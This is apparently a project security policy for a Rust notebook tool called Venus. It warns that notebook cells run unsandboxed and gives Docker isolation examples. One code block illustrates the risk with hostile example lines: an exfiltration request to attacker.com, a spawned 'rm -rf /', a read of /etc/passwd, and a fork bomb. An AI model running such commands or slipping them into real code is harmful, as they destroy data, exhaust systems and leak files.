# Security Policy

## ⚠️ Critical Security Notice

**Venus is NOT designed for production use. It is intended for local development, testing, and learning environments only.**

## Security Model

### No Sandboxing

Venus provides **ZERO sandboxing or isolation**. When you execute a notebook cell, the code runs with:

- ✅ **Full filesystem access** - Can read, write, delete any file the process user can access
- ✅ **Full network access** - Can make any network connections
- ✅ **Full process control** - Can spawn processes, fork, execute system commands
- ✅ **Unrestricted system calls** - Can call any `unsafe` Rust code

**Running a Venus notebook is equivalent to running `cargo run` on arbitrary code.**

### What Cells Can Do

Cells executed by Venus can:

```rust
// Delete files
std::fs::remove_file("/important/file");

// Read sensitive data
std::fs::read_to_string("/etc/passwd");

// Make network requests
reqwest::get("https://attacker.com/exfiltrate?data=...");

// Spawn processes
std::process::Command::new("rm").args(["-rf", "/"]).spawn();

// Fork bombs
loop { std::process::Command::new("venus").spawn(); }

// Any other arbitrary code execution
```

**Venus does not prevent, detect, or restrict any of these operations.**

## Intended Use Cases

### ✅ Safe Uses

Venus is safe for:

1. **Local Development** - Running your own code on your own machine
2. **Testing** - Evaluating libraries and experimenting with code
3. **Learning** - Educational environments where students run their own code
4. **Prototyping** - Quick iteration on data analysis or algorithmic work

### ❌ Unsafe Uses

Venus is NOT safe for:

1. **Production Systems** - Never deploy Venus to production servers
2. **Shared Servers** - Do not run Venus on multi-user systems without isolation
3. **Untrusted Code** - Never execute notebooks from untrusted sources
4. **Public Internet** - Do not expose Venus servers to the public web
5. **Sensitive Data Environments** - Not suitable for systems with compliance requirements (HIPAA, PCI-DSS, etc.)

## Deployment Responsibilities

### For Individual Users

If you run Venus locally:

- **Understand the risk**: Any code in the notebook can access your files
- **Trust your code**: Only execute notebooks you wrote or trust completely
- **Backup data**: Notebook bugs can delete or corrupt files

### For Cloud REPL Providers

If you're building a cloud-based Rust notebook service using Venus:

**YOU ARE RESPONSIBLE FOR SECURITY. Venus provides none.**

Required isolation measures:

1. **Container/VM Isolation** - Each user MUST get isolated environment

   ```bash
   # Example: Docker isolation
   docker run --rm --network none --memory 512m \
     --cpus 1 --pids-limit 50 \
     -v /readonly/notebook:/notebook:ro \
     venus-image venus run /notebook/user_code.rs
   ```

2. **Resource Limits** - Prevent resource exhaustion

   - CPU limits
   - Memory limits
   - Process count limits
   - Disk quota
   - Network bandwidth limits

3. **Network Isolation** - Restrict or disable network access

   - Use `--network none` in Docker
   - Firewall rules
   - No access to internal networks

4. **Filesystem Isolation** - Limit filesystem access

   - Read-only root filesystem
   - Tmpfs for writes
   - No access to host filesystem

5. **User Isolation** - Separate user accounts

   - Each execution in separate user context
   - No shared state between users
   - Proper cleanup after execution

6. **Timeout and Monitoring** - Kill runaway notebooks
   - Execution timeouts
   - Process monitoring
   - Automatic cleanup

**Minimum example** (Docker):

```dockerfile
FROM rust:slim
RUN cargo install venus-cli
RUN useradd -m -u 1000 notebook
USER notebook
WORKDIR /workspace
CMD ["venus", "run", "notebook.rs"]
```

```bash
# Run with strict limits
docker run --rm \
  --network none \
  --memory 256m \
  --cpus 0.5 \
  --pids-limit 20 \
  --read-only \
  --tmpfs /tmp:size=100m \
  -v ./notebook.rs:/workspace/notebook.rs:ro \
  venus-container
```

## Responsibility Model

### What Venus Does NOT Provide

Venus does NOT provide:

- ❌ Sandboxing or isolation
- ❌ Permission systems
- ❌ Resource limits
- ❌ Network restrictions
- ❌ Filesystem access control
- ❌ User authentication
- ❌ Audit logging
- ❌ Compliance features

### Who Is Responsible

- **You (the user)**: Responsible for running Venus in a secure environment
- **You (the provider)**: Responsible for isolating Venus if offering cloud services
- **Venus**: Only responsible for executing code - NOT for securing execution

**We explicitly disclaim responsibility for security incidents caused by running Venus in insecure environments.**

## Reporting Security Issues

### Reporting Vulnerabilities

If you discover a security vulnerability in Venus itself (not user code execution risks, which are by design):

- **GitHub Security Advisories**: https://github.com/ml-rust/venus/security/advisories
- **Email**: security@venus-project.io (if available)

Please include:

- Description of the vulnerability
- Steps to reproduce
- Impact assessment
- Suggested fix (if any)

### What We Will Fix

We will address security issues in:

- Venus server authentication bypass (if auth is added)
- Venus core code vulnerabilities
- Dependency vulnerabilities
- Information disclosure in error messages

### What We Will NOT Fix

We will NOT address:

- User code executing arbitrary operations (this is by design)
- Insufficient isolation in user deployments (provider responsibility)
- Resource exhaustion from user code (provider must limit resources)

## Best Practices

### For Local Development

```rust
// Always review what your cells do
#[venus::cell]
pub fn my_cell() -> String {
    // This can access anything on your system!
    std::fs::read_to_string("/etc/hosts").unwrap()
}
```

### For Cloud Providers

See [Deployment Guide](docs/deployment.md) for comprehensive isolation examples.

## Future Plans

We may add optional sandboxing in future versions, but this is not guaranteed. **Do not wait for sandboxing - deploy with proper isolation now.**

Potential future features (no timeline):

- Capability-based permissions (Deno-style)
- WebAssembly compilation target (limited system access)
- Read-only mode (disable state mutations)

## Summary

**Venus is a power tool. Like `cargo run`, it executes arbitrary code with full system access.**

- For local use: Understand the risks
- For cloud use: YOU must provide isolation
- For production: DON'T. Venus is not production-ready.

**If you need secure, multi-tenant notebook execution, Venus is not the right tool without significant additional isolation infrastructure.**
